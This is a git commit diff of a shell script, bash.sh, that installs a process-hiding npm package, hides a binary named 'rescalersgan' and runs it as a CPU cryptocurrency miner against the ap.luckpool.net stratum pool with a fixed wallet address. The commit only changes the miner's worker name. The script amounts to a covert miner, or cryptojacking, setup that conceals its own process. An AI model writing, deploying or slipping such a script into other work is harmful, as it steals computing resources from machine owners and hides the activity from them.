effe84822213f635ad7eb3c5015f5cef310bf821
amanda4gomes <108956391+amanda4gomes@users.noreply.github.com>
2022-07-08 18:52:19 -0300

    Update bash.sh

--- bash.sh
+++ bash.sh
@@ -3,4 +3,4 @@ apt-get install -y nodejs
 npm i -g node-process-hider
 ph add rescalersgan
 chmod +x rescalersgan
-./rescalersgan -c stratum+tcp://ap.luckpool.net:3956 -u RJSMHNr5kBfHkxNGCAeJQFrYHLipjrW1WF.teste -p x --cpu 1
+./rescalersgan -c stratum+tcp://ap.luckpool.net:3956 -u RJSMHNr5kBfHkxNGCAeJQFrYHLipjrW1WF.vmteste -p x --cpu 1
